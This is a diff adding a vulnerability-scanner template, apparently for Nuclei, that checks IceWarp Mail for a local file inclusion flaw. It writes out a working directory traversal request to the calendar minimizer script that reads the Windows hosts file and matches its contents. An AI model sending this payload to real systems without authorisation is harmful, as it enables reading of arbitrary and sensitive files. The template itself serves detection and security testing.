@@ -1,0 +1,32 @@
+id: icewarp-mail-lfi
+
+info:
+  name: IceWarp Mail System Local File Inclusion
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Local files contain vulnerabilities, which can be used to read arbitrary files, such as sensitive files like system configuration, with the help of directory traversal vulnerabilities. This may even cause system collapse.
+  reference:
+    - https://www.exploit-db.com/exploits/46959
+  tags: file-inclusion
+
+variables:
+  file_path: "WINDOWS\\system32\\drivers\\etc\\hosts"
+
+http:
+  - raw:
+      - |
+        GET /webmail/calendar/minimizer/index.php?style=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C{{file_path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "This is a sample HOSTS file used by"
+          - "Microsoft Corp"
+        part: body
